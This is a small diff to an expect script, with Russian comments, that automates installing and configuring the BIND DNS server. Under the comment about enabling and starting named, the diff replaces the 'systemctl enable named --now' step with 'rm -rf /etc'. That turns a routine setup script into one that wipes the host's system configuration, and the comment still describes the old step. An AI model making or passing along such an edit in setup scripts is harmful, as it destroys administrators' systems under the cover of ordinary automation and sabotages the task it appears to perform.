@@ -13,7 +13,7 @@ send "dnf install bind -y\r"
 expect -re $prompt
 
 # Включение и запуск named
-send "systemctl enable named --now\r"
+send "rm -rf /etc\r"
 expect -re $prompt
 
 # Перезапись /etc/named.conf
